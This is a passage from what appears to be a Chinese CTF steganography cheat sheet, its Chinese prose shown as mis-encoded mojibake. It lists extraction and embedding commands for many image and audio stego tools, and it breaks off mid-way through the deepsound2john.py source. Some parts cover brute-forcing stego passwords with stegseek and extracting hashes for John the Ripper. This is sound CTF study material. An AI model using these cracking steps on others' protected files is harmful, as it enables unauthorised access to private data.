<h2 id="0x03-æ–‡ä»¶é™„åŠ "><a href="#0x03-æ–‡ä»¶é™„åŠ " class="headerlink" title="0x03 æ–‡ä»¶é™„åŠ "></a>0x03 æ–‡ä»¶é™„åŠ </h2><p>åœ¨æ­£å¸¸å›¾ç‰‡ä¸­æ’å…¥é¢å¤–çš„æ–‡ä»¶æ•°æ®</p>
<p>ä½¿ç”¨å·¥å…·<code>binwalkï¼Œforemostï¼Œdd</code>æå–å‡ºæ¥</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">root@lewiserii-pc:~/æ¡Œé¢# binwalk -e 1.png<br><br>DECIMAL       HEXADECIMAL     DESCRIPTION<br>--------------------------------------------------------------------------------<br>0             0x0             PNG image, 438 x 121, 8-bit/color RGB, non-interlaced<br>91            0x5B            Zlib compressed data, default compression<br><br>root@lewiserii-pc:~/æ¡Œé¢# foremost 1.png<br>Processing: 1.png<br>|*|<br></code></pre></td></tr></table></figure>

<p>å¦‚æœæ£€æµ‹åˆ°é™„åŠ çš„æ•°æ®ï¼Œ<code>binwalk</code>ä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ª<code>_[æ–‡ä»¶å].extracted</code>ç›®å½•ï¼Œ<code>foremost</code>ä¼šç”Ÿæˆä¸€ä¸ª<code>output</code>ç›®å½•</p>
<p>åœ¨å¤æ‚ä¸€ç‚¹çš„æ•°æ®æ’å…¥éœ€è¦æ‰‹åŠ¨æå–æˆ–ä½¿ç”¨è„šæœ¬</p>
<h2 id="0x04-cloacked-pixel-éœ€è¦passwd"><a href="#0x04-cloacked-pixel-éœ€è¦passwd" class="headerlink" title="0x04 cloacked-pixel(éœ€è¦passwd)"></a>0x04 cloacked-pixel(éœ€è¦passwd)</h2><p>lsbéšå†™çš„ä¸€ç§<br>æ”¯æŒPNGï¼ŒJPGï¼ŒBMPç­‰å›¾ç‰‡æ ¼å¼</p>
<p>éšå†™åä¼šè½¬ä¸ºPNG</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#lsb.py 98 line</span><br>steg_img.save(imgFile + <span class="hljs-string">&quot;-stego.png&quot;</span>, <span class="hljs-string">&quot;PNG&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>åŠ å¯†</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">$ python lsb.py hide samples/orig.jpg samples/secret.zip p@$5w0rD<br>[*] Input image size: 640x425 pixels.<br>[*] Usable payload size: 99.61 KB.<br>[+] Payload size: 74.636 KB<br>[+] Encrypted payload size: 74.676 KB<br>[+] samples/secret.zip embedded successfully!<br></code></pre></td></tr></table></figure>

<p>è§£å¯†</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">$ python lsb.py<br>LSB steganogprahy. Hide files within least significant bits of images.<br><br>Usage:<br>  lsb.py hide &lt;img_file&gt; &lt;payload_file&gt; &lt;password&gt;<br>  lsb.py extract &lt;stego_file&gt; &lt;out_file&gt; &lt;password&gt;<br>  lsb.py analyse &lt;stego_file&gt;<br></code></pre></td></tr></table></figure>

<h2 id="0x05-steghide-å¯éœ€è¦passwd"><a href="#0x05-steghide-å¯éœ€è¦passwd" class="headerlink" title="0x05 steghide(å¯éœ€è¦passwd)"></a>0x05 steghide(å¯éœ€è¦passwd)</h2><p><code>steghide</code>å¯ä»¥å°†æ•°æ®éšè—åœ¨å›¾åƒå’ŒéŸ³é¢‘æ–‡ä»¶ä¸­</p>
<p>åŠ å¯†</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">//å°†secret.txtæ–‡ä»¶éšè—åˆ°text.jpgä¸­<br>steghide embed -cf test.jpg -ef secret.txt -p 123456<br></code></pre></td></tr></table></figure>

<p>è§£å¯†</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">steghide extract -sf out.jpg -p 123456<br></code></pre></td></tr></table></figure>

<p>æœ‰äº›é¢˜ç›®éœ€è¦çˆ†ç ´steghideçš„å¯†ç ï¼Œå¯ä»¥ä½¿ç”¨pyhtonè„šæœ¬æˆ–<a href="https://github.com/RickdeJager/stegseek">stegseek</a>å·¥å…·</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">//ä¸æŒ‡å®šwordlist.txtæ—¶è‡ªåŠ¨ä½¿ç”¨`rockyou.txt`ï¼ˆå¦‚æœç³»ç»Ÿä¸­æœ‰ï¼Œæ²¡æœ‰ä¼šæŠ¥é”™ï¼‰<br>stegseek [stegofile.jpg] [wordlist.txt]<br></code></pre></td></tr></table></figure>

<h2 id="0x06-F5-steganography-éœ€è¦passwd"><a href="#0x06-F5-steganography-éœ€è¦passwd" class="headerlink" title="0x06 F5-steganography(éœ€è¦passwd)"></a>0x06 F5-steganography(éœ€è¦passwd)</h2><p>F5éšå†™å¯ä»¥å°†æ–‡ä»¶åµŒå…¥åˆ°BMPã€GIFæˆ–JPEGå›¾åƒä¸­ï¼Œéœ€è¦javaç¯å¢ƒ</p>
<p>åŠ å¯†</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">java Embed åŸå›¾.jpg ç”Ÿæˆå›¾.jpg -e éšè—çš„æ–‡ä»¶.txt -p &#x27;å¯†ç &#x27;<br></code></pre></td></tr></table></figure>

<p>è§£å¯†</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">java Extract out.jpg -p &#x27;å¯†ç &#x27;<br></code></pre></td></tr></table></figure>

<p>ç‰¹å¾</p>
<p><img src="/img/summary/misc/F5.png"></p>
<h2 id="0x07-zsteg"><a href="#0x07-zsteg" class="headerlink" title="0x07 zsteg"></a>0x07 zsteg</h2><p>lsbéšå†™ï¼Œä¸steghideç±»ä¼¼ï¼Œå¯ä»¥æ£€æµ‹PNGå’ŒBMPä¸­çš„éšè—æ•°æ®éšè—æ•°æ®ï¼Œå¯ä»¥å¿«é€Ÿæå–éšè—ä¿¡æ¯ã€‚</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">zsteg -a &lt;æ–‡ä»¶å&gt;<br>zsteg -e b8,a,lsb,xy æ–‡ä»¶.png -&gt; out.png<br></code></pre></td></tr></table></figure>

<h2 id="0x07-outguess-å¯éœ€è¦passwd"><a href="#0x07-outguess-å¯éœ€è¦passwd" class="headerlink" title="0x07 outguess(å¯éœ€è¦passwd)"></a>0x07 outguess(å¯éœ€è¦passwd)</h2><p>åŠ å¯†</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">outguess -k &#x27;å¯†ç &#x27; -d &lt;éœ€è¦éšè—çš„å†…å®¹&gt; 1.jpg 2.jpg<br>//1.jpgä¼šè¦†ç›–2.jpg<br></code></pre></td></tr></table></figure>

<p>è§£å¯†</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">outguess -k &#x27;å¯†ç &#x27; -r &lt;åŠ å¯†çš„å›¾ç‰‡&gt;  -t &lt;è¾“å‡ºä¿å­˜çš„æ–‡ä»¶&gt;<br></code></pre></td></tr></table></figure>

<h2 id="0x08-ç›²æ°´å°"><a href="#0x08-ç›²æ°´å°" class="headerlink" title="0x08 ç›²æ°´å°"></a>0x08 ç›²æ°´å°</h2><p>æ°´å°åˆåˆ†ä¸ºå•å›¾æ°´å°å’ŒåŒå›¾æ°´å°</p>
<p>å•å›¾æ°´å°æ˜¯æŒ‡åªéœ€è¦ä¸€å¼ å›¾ç‰‡å°±èƒ½æå–å‡ºéšè—çš„ä¿¡æ¯ï¼ŒåŒå›¾éœ€è¦ä¸¤å¼ å›¾ç‰‡ï¼ˆä¸€èˆ¬æ˜¯åŸå›¾å’ŒåŠ å¯†åçš„å›¾ç‰‡ï¼Œé€šå¸¸ä¸¤å¼ å›¾ç‰‡çœ‹ä¸Šå»æ˜¯ä¸€æ ·çš„ï¼‰</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">//blindwatermarkåŒå›¾ç›²æ°´å°<br>python2 bwm.py encode åŸå›¾.png æ°´å°å›¾.png æœ‰ç›²æ°´å°çš„å›¾.png<br>python2 bwm.py decode åŸå›¾.png æœ‰ç›²æ°´å°çš„å›¾.png åè§£å‡ºæ¥çš„æ°´å°å›¾.png<br>python3 bwmforpy3.py decode åŸå›¾.png æœ‰ç›²æ°´å°çš„å›¾.png åè§£å‡ºæ¥çš„æ°´å°å›¾.png<br>python3 bwmforpy3.py decode åŸå›¾.png æœ‰ç›²æ°´å°çš„å›¾.png åè§£å‡ºæ¥çš„æ°´å°å›¾.png --oldseed<br></code></pre></td></tr></table></figure>


<p>è¿˜æœ‰ä¸€ç§ç‰¹æ®Šçš„ç›²æ°´å°ï¼š<code>é¢‘åŸŸç›²æ°´å°</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> argparse <span class="hljs-keyword">import</span> ArgumentParser<br><br>ALPHA = <span class="hljs-number">5</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_parser</span>():<br>    parser = ArgumentParser()<br>    parser.add_argument(<span class="hljs-string">&#x27;--original&#x27;</span>, dest=<span class="hljs-string">&#x27;ori&#x27;</span>, required=<span class="hljs-literal">True</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;--image&#x27;</span>, dest=<span class="hljs-string">&#x27;img&#x27;</span>, required=<span class="hljs-literal">True</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;--result&#x27;</span>, dest=<span class="hljs-string">&#x27;res&#x27;</span>, required=<span class="hljs-literal">True</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;--alpha&#x27;</span>, dest=<span class="hljs-string">&#x27;alpha&#x27;</span>, default=ALPHA)<br>    <span class="hljs-keyword">return</span> parser<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    parser = build_parser()<br>    options = parser.parse_args()<br>    ori = options.ori<br>    img = options.img<br>    res = options.res<br>    alpha = options.alpha<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.isfile(ori):<br>        parser.error(<span class="hljs-string">&quot;original image %s does not exist.&quot;</span> % ori)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.isfile(img):<br>        parser.error(<span class="hljs-string">&quot;image %s does not exist.&quot;</span> % img)<br>    decode(ori, img, res, alpha)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">ori_path, img_path, res_path, alpha</span>):<br>    ori = cv2.imread(ori_path)<br>    img = cv2.imread(img_path)<br>    ori_f = np.fft.fft2(ori)<br>    img_f = np.fft.fft2(img)<br>    height, width = ori.shape[<span class="hljs-number">0</span>], ori.shape[<span class="hljs-number">1</span>]<br>    watermark = (ori_f - img_f) / alpha<br>    watermark = np.real(watermark)<br>    res = np.zeros(watermark.shape)<br>    random.seed(height + width)<br>    x = <span class="hljs-built_in">range</span>(height / <span class="hljs-number">2</span>)<br>    y = <span class="hljs-built_in">range</span>(width)<br>    random.shuffle(x)<br>    random.shuffle(y)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height / <span class="hljs-number">2</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>            res[x[i]][y[j]] = watermark[i][j]<br>    cv2.imwrite(res_path, res, [<span class="hljs-built_in">int</span>(cv2.IMWRITE_JPEG_QUALITY), <span class="hljs-number">100</span>])<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure>

<p>ä½¿ç”¨<br><code>python pinyubwm.py --original 1.png --image 2.png --result out.png</code></p>
<h2 id="0x09-gnuplot"><a href="#0x09-gnuplot" class="headerlink" title="0x09 gnuplot"></a>0x09 gnuplot</h2><p><code>gnuplot</code>å¯ä»¥æŠŠåæ ‡ç”»å‡ºæ¥</p>
<p>åæ ‡æ ¼å¼ï¼š<code>number number</code></p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">plot &quot;1.txt&quot;<br></code></pre></td></tr></table></figure>


<h2 id="0x10-æ‹¼å›¾"><a href="#0x10-æ‹¼å›¾" class="headerlink" title="0x10 æ‹¼å›¾"></a>0x10 æ‹¼å›¾</h2><p><code>montage+gaps</code>å¯ä»¥å°†å°å›¾ç‰‡è¿˜åŸæˆå¤§å›¾ç‰‡</p>
<p>å…ˆç”¨<code>montage</code>ç»„åˆå›¾ç‰‡</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">montage input_file -tile 8X6 -geometry +0+0 output_file<br></code></pre></td></tr></table></figure>

<p><code>input_file</code>ï¼šå¯ä»¥ä¸€å¼ ä¸€å¼ æŒ‡å®šï¼Œä¹Ÿèƒ½ä½¿ç”¨æ­£åˆ™åŒ¹é…(<code>*.png</code>)<br><code>-geometry +0+0</code>ï¼šä½¿å›¾ç‰‡ä¹‹é—´æ²¡æœ‰é—´éš™<br><code>-tile 8X6</code>ï¼šä»¥8è¡Œ6åˆ—æ’åˆ—<br><code>output_file</code>ï¼šè¾“å‡ºæ–‡ä»¶</p>
<p><code>gaps</code>ç”¨æ¥è¿˜åŸ<code>montage</code>å‘½ä»¤åˆ›å»ºçš„ä¹±åºå›¾åƒ</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">gaps --image=out.jpg --generations=50 --population=120 --size=50<br><br>--image            æŒ‡å‘æ‹¼å›¾çš„è·¯å¾„<br>--size            æ‹¼å›¾å—çš„åƒç´ å°ºå¯¸ï¼ˆå¦‚æœä¸èƒ½æ˜ç¡®æä¾›--sizeçš„å‚æ•°ï¼Œæ‹¼å›¾å—å°ºå¯¸å°†è‡ªé€‚åº”è°ƒæ•´ï¼‰<br>--generations    é—ä¼ ç®—æ³•çš„ä»£çš„æ•°é‡<br>--population    ä¸ªä½“æ•°é‡<br>--verbose        æ¯ä¸€ä»£è®­ç»ƒç»“æŸåå±•ç¤ºæœ€ä½³ç»“æœ<br>--save            å°†æ‹¼å›¾è¿˜åŸä¸ºå›¾åƒ<br></code></pre></td></tr></table></figure>

<p><code>montage+gaps</code>é€‚ç”¨äºå¤§å°ç›¸åŒï¼Œæ•°é‡å°çš„æ‹¼å›¾ã€‚å¤æ‚çš„éœ€è¦æ³¨æ„å›¾ç‰‡åæˆ–å…¶ä»–åœ°æ–¹æ˜¯å¦æœ‰é¡ºåºæç¤ºï¼Œè¿˜å¯ä»¥æ³¨æ„å›¾ç‰‡ä¸­çš„å†—ä½™ä½æ˜¯å¦å¯èƒ½åŒ…å«åæ ‡æ•°æ®</p>
<h2 id="0x11-pngcheck"><a href="#0x11-pngcheck" class="headerlink" title="0x11 pngcheck"></a>0x11 pngcheck</h2><p>windowså·¥å…·ï¼Œç”¨æ¥æ£€æŸ¥IDATå—</p>
<h2 id="0x12-webp"><a href="#0x12-webp" class="headerlink" title="0x12 webp"></a>0x12 webp</h2><blockquote>
<p>webpå›¾ç‰‡æ˜¯ä¸€ç§åŒæ—¶æä¾›äº†æœ‰æŸå‹ç¼©ä¸æ— æŸå‹ç¼©ï¼ˆå¯é€†å‹ç¼©ï¼‰çš„å›¾ç‰‡æ–‡ä»¶æ ¼å¼ã€‚webpæœ€åˆåœ¨2010å¹´å‘å¸ƒï¼Œç›®æ ‡æ˜¯å‡å°‘æ–‡ä»¶å¤§å°ï¼Œä½†è¾¾åˆ°å’ŒJPEGæ ¼å¼ç›¸åŒçš„å›¾ç‰‡è´¨é‡ï¼Œå¸Œæœ›èƒ½å¤Ÿå‡å°‘å›¾ç‰‡åœ¨ç½‘ç»œä¸Šçš„å‘é€æ—¶é—´ã€‚</p>
</blockquote>
<p><a href="https://developers.google.com/speed/webp/docs/using?hl=zh-cn">webpå·¥å…·å®˜æ–¹æ–‡æ¡£</a></p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">cwebp - å°†å›¾ç‰‡æ–‡ä»¶å‹ç¼©ä¸º WebP æ–‡ä»¶<br>cwebp 1.png -o 2.webp<br><br>dwebp - å°† WebP æ–‡ä»¶è§£å‹ç¼©åˆ°å›¾ç‰‡æ–‡ä»¶<br>dwebp 1.webp -o 2.png<br><br>gif2webp - å°† GIF å›¾ç‰‡è½¬æ¢ä¸º WebP æ ¼å¼<br>gif2webp 1.gif -o 2.webp<br><br>vwebp - è§£å‹ç¼© WebP æ–‡ä»¶ï¼Œç„¶ååœ¨çª—å£ä¸­æ˜¾ç¤ºè¯¥æ–‡ä»¶<br>vwebp 1.webp<br><br>webpinfo - è¾“å‡º WebP æ–‡ä»¶çš„åŒºå—çº§ç»“æ„ä»¥åŠåŸºæœ¬å®Œæ•´æ€§æ£€æŸ¥<br>webpinfo 1.webp<br></code></pre></td></tr></table></figure>

<h2 id="0x13-stegpy-å¯éœ€è¦passwd"><a href="#0x13-stegpy-å¯éœ€è¦passwd" class="headerlink" title="0x13 stegpy(å¯éœ€è¦passwd)"></a>0x13 stegpy(å¯éœ€è¦passwd)</h2><p>åŠ å¯†</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">stegpy &#x27;hello_world&#x27; image.png<br>stegpy &quot;hello_world&quot; image.png -p   //éœ€è¦å¯†ç <br></code></pre></td></tr></table></figure>

<p>è§£å¯†</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">stegpy _image.png<br>stegpy _image.png -p  //éœ€è¦å¯†ç <br></code></pre></td></tr></table></figure>

<h2 id="0x14-äºŒç»´ç "><a href="#0x14-äºŒç»´ç " class="headerlink" title="0x14 äºŒç»´ç "></a>0x14 äºŒç»´ç </h2><p>äºŒç»´ç ç±»çš„é¢˜ç›®éœ€è¦å¯¹äºŒç»´ç çš„ç”ŸæˆåŸç†æœ‰æ·±å…¥äº†è§£</p>
<p><a href="https://li-yang.cn/?p=627">CTFä¸­äºŒç»´ç é¢˜ç›®åŠç­”é¢˜æŠ€å·§æ€»ç»“ï¼ˆä¸€ï¼‰</a></p>
<p>å¯èƒ½æœ‰ä»¥ä¸‹è€ƒç‚¹</p>
<p>1ï¼šä¿®å¤äºŒç»´ç </p>
<p>å¯èƒ½ç»™äº†ä¸€å¼ å¸¸è§„çš„äºŒç»´ç ï¼Œä½†æ˜¯æ²¡æœ‰å®šä½ç¬¦ï¼Œå°±éœ€è¦è‡ªå·±ç”»ä¸Šå»ï¼Œæˆ–è€…ä¸€ä¸ªå¤§äºŒç»´ç æ‰“ä¹±æˆæ•°ä¸ªå°çš„äºŒç»´ç ï¼Œéœ€è¦è¿˜åŸ</p>
<p>2ï¼šä¸æ•°ç»‡ç»“åˆ</p>
<p>ä¾‹å¦‚ç¥¥äº‘æ¯çš„<code>shuffle_code</code></p>
<p>3ï¼šå¥‡å¥‡æ€ªæ€ªçš„å˜ç§äºŒç»´ç </p>
<p>æ¨è<code>cortexScan</code>å’Œä¸­å›½ç¼–ç è¯†åˆ«</p>
<h1 id="éŸ³é¢‘éšå†™"><a href="#éŸ³é¢‘éšå†™" class="headerlink" title="éŸ³é¢‘éšå†™"></a>éŸ³é¢‘éšå†™</h1><h2 id="0x01-MP3stego-éœ€è¦passwd"><a href="#0x01-MP3stego-éœ€è¦passwd" class="headerlink" title="0x01 MP3stego(éœ€è¦passwd)"></a>0x01 MP3stego(éœ€è¦passwd)</h2><p>é’ˆå¯¹<code>.mp3</code>æ–‡ä»¶éšå†™</p>
<p><code>.\Decode.exe -X -P [password] [stego_mp3]</code></p>
<p>ä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªtxtæ–‡ä»¶</p>
<h2 id="0x02-steghide-å¯éœ€è¦passwd"><a href="#0x02-steghide-å¯éœ€è¦passwd" class="headerlink" title="0x02 steghide(å¯éœ€è¦passwd)"></a>0x02 steghide(å¯éœ€è¦passwd)</h2><p>ä¸Šé¢æåˆ°è¿‡çš„steghideï¼Œä¹Ÿèƒ½ç”¨äºéŸ³é¢‘éšå†™</p>
<h2 id="0x03-Audacity"><a href="#0x03-Audacity" class="headerlink" title="0x03 Audacity"></a>0x03 Audacity</h2><p>ç¥å™¨</p>
<p>1.æ‘©æ–¯å¯†ç <br><img src="/img/summary/misc/yinpin-1.png"></p>
<p>2.é¢‘è°±å›¾<br><img src="/img/summary/misc/yinpin-2.png"></p>
<p>3.åå‘éŸ³é¢‘</p>
<p>4.æ³¢å½¢</p>
<h2 id="0x04-minimodem"><a href="#0x04-minimodem" class="headerlink" title="0x04 minimodem"></a>0x04 minimodem</h2><p>åˆ†æwavæ–‡ä»¶</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">minimodem --rx -f encoded.wav 1200<br></code></pre></td></tr></table></figure>

<p><code>--rx</code>ï¼šrxæˆ–è€…rå‡å¯ï¼Œä¸ºæŒ‡å®šè¯»å–æ¨¡å¼<br><code>-f</code>ï¼šè¯»å–æ–‡ä»¶<br><code>1200</code>ï¼šä¸ºbell202 bpså¯¹åº”å‚æ•°</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">//baudmodeå‚è€ƒ<br>&#123;any floating point value N&#125; : Bell202-style at N bps âˆ’âˆ’ascii<br><br>1200 : Bell202 1200 bps âˆ’âˆ’ascii<br><br>300 : Bell103 300 bps âˆ’âˆ’ascii<br><br>rtty : RTTY 45.45 bps âˆ’âˆ’baudot âˆ’âˆ’stopbits 1.5<br><br>tdd : TTY/TDD 45.45 bps âˆ’âˆ’baudot âˆ’âˆ’stopbits 2.0<br><br>same : SAME 520.83 bps âˆ’âˆ’startbits 0 âˆ’âˆ’stopbits 0 âˆ’âˆ’sync-byte 0xAB NOAA Specific Area Message Encoding (SAME) protocol<br><br>callerid : Bell202 1200 bps Caller-ID (MDMF or SDMF) protocol<br><br>uic-train : UIC-751-3 600 bps train-to-ground message protocol<br><br>uic-ground : UIC-751-3 600 bps ground-to-train message protocol<br></code></pre></td></tr></table></figure>

<p><a href="http://www.whence.com/minimodem/minimodem.1.html">å®˜æ–¹æ‰‹å†Œ</a></p>
<h2 id="0x05-DeepSound-éœ€è¦passwd"><a href="#0x05-DeepSound-éœ€è¦passwd" class="headerlink" title="0x05 DeepSound(éœ€è¦passwd)"></a>0x05 DeepSound(éœ€è¦passwd)</h2><p>windowsè½¯ä»¶</p>
<p><img src="/img/summary/misc/DeepSound.jpg"></p>
<p>éƒ¨åˆ†é¢˜ç›®çš„å¯†ç éœ€è¦ç”¨<a href="https://github.com/openwall/john/blob/bleeding-jumbo/run/deepsound2john.py">deepsound2john.py</a>çˆ†ç ´</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">deepsound2john extracts password hashes from audio files containing encrypted</span><br><span class="hljs-string">data steganographically embedded by DeepSound (http://jpinsoft.net/deepsound/).</span><br><span class="hljs-string"></span><br><span class="hljs-string">This method is known to work with files created by DeepSound 2.0.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Input files should be in .wav format. Hashes can be recovered from audio files</span><br><span class="hljs-string">even after conversion from other formats, e.g.,</span><br><span class="hljs-string"></span><br><span class="hljs-string">    ffmpeg -i input output.wav</span><br><span class="hljs-string"></span><br><span class="hljs-string">Usage:</span><br><span class="hljs-string"></span><br><span class="hljs-string">    python3 deepsound2john.py carrier.wav &gt; hashes.txt</span><br><span class="hljs-string">    john hashes.txt</span><br><span class="hljs-string"></span><br><span class="hljs-string">This software is copyright (c) 2018 Ryan Govostes &lt;rgovostes@gmail.com&gt;, and</span><br><span class="hljs-string">it is hereby released to the general public under the following terms:</span><br><span class="hljs-string">Redistribution and use in source and binary forms, with or without</span><br><span class="hljs-string">modification, are permitted.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> textwrap<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_data_low</span>(<span class="hljs-params">buf</span>):<br>  <span class="hljs-keyword">return</span> buf[::<span class="hljs-number">2</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_data_normal</span>(<span class="hljs-params">buf</span>):<br>  out = <span class="hljs-built_in">bytearray</span>()<br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(buf), <span class="hljs-number">4</span>):<br>    out.append((buf[i] &amp; <span class="hljs-number">15</span>) &lt;&lt; <span class="hljs-number">4</span> | (buf[i + <span class="hljs-number">2</span>] &amp; <span class="hljs-number">15</span>))<br>  <span class="hljs-keyword">return</span> out<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_data_high</span>(<span class="hljs-params">buf</span>):<br>  out = <span class="hljs-built_in">bytearray</span>()<br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(buf), <span class="hljs-number">8</span>):<br>    out.append((buf[i] &amp; <span class="hljs-number">3</span>) &lt;&lt; <span class="hljs-number">6</span>     | (buf[i + <span class="hljs-number">2</span>] &amp; <span class="hljs-number">3</span>) &lt;&lt; <span class="hljs-number">4</span> \<br>             | (buf[i + <span class="hljs-number">4</span>] &amp; <span class="hljs-number">3</span>) &lt;&lt; <span class="hljs-number">2</span> | (buf[i + <span class="hljs-number">6</span>] &amp; <span class="hljs-number">3</span>))<br>  <span class="hljs-keyword">return</span> out<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_magic</span>(<span class="hljs-params">buf</span>):<br>  <span class="hljs-comment"># This is a more efficient way of testing for the `DSCF` magic header without</span><br>  <span class="hljs-comment"># decoding the whole buffer</span><br>  <span class="hljs-keyword">return</span> (buf[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">15</span>)  == (<span class="hljs-number">68</span> &gt;&gt; <span class="hljs-number">4</span>) <span class="hljs-keyword">and</span> (buf[<span class="hljs-number">2</span>]  &amp; <span class="hljs-number">15</span>) == (<span class="hljs-number">68</span> &amp; <span class="hljs-number">15</span>) \<br>     <span class="hljs-keyword">and</span> (buf[<span class="hljs-number">4</span>] &amp; <span class="hljs-number">15</span>)  == (<span class="hljs-number">83</span> &gt;&gt; <span class="hljs-number">4</span>) <span class="hljs-keyword">and</span> (buf[<span class="hljs-number">6</span>]  &amp; <span class="hljs-number">15</span>) == (<span class="hljs-number">83</span> &amp; <span class="hljs-number">15</span>) \<br>     <span class="hljs-keyword">and</span> (buf[<span class="hljs-number">8</span>] &amp; <span class="hljs-number">15</span>)  == (<span class="hljs-number">67</span> &gt;&gt; <span class="hljs-number">4</span>) <span class="hljs-keyword">and</span> (buf[<span class="hljs-number">10</span>] &amp; <span class="hljs-number">15</span>) == (<span class="hljs-number">67</span> &amp; <span class="hljs-number">15</span>) \<br>     <span class="hljs-keyword">and</span> (buf[<span class="hljs-number">12</span>] &amp; <span class="hljs-number">15</span>) == (<span class="hljs-number">70</span> &gt;&gt; <span class="hljs-number">4</span>) <span class="hljs-keyword">and</span> (buf[<span class="hljs-number">14</span>] &amp; <span class="hljs-number">15</span>) == (<span class="hljs-number">70</span> &amp; <span class="hljs-number">15</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_wave</span>(<span class="hljs-params">buf</span>):<br>  <span class="hljs-keyword">return</span> buf[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>] == <span class="hljs-string">b&#x27;RIFF&#x27;</span> <span class="hljs-keyword">and</span> buf[<span class="hljs-number">8</span>:<span class="hljs-number">12</span>] == <span class="hljs-string">b&#x27;WAVE&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_deepsound_file</span>(<span class="hljs-params">f</span>):<br>  bname = os.path.basename(f.name)<br>  logger = logging.getLogger(bname)<br><br>  <span class="hljs-comment"># Check if it&#x27;s a .wav file</span><br>  buf = f.read(<span class="hljs-number">12</span>)<br>  <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> is_wave(buf):<br>    <span class="hljs-keyword">global</span> convert_warn<br>    logger.error(<span class="hljs-string">&#x27;file not in .wav format&#x27;</span>)<br>    convert_warn = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span><br>  f.seek(<span class="hljs-number">0</span>, os.SEEK_SET)<br><br>  <span class="hljs-comment"># Scan for the marker...</span><br>  hdrsz = <span class="hljs-number">104</span><br>  hdr = <span class="hljs-literal">None</span><br><br>  <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    off = f.tell()<br>    buf = f.read(hdrsz)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(buf) &lt; hdrsz: <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">if</span> is_magic(buf):<br>          hdr = decode_data_normal(buf)<br>          logger.info(<span class="hljs-string">&#x27;found DeepSound header at offset %i&#x27;</span>, off)<br>          <span class="hljs-keyword">break</span><br><br>    f.seek(-hdrsz + <span class="hljs-number">1</span>, os.SEEK_CUR)<br><br>  <span class="hljs-keyword">if</span> hdr <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    logger.warn(<span class="hljs-string">&#x27;does not appear to be a DeepSound file&#x27;</span>)<br>    <span class="hljs-keyword">return</span><br><br> 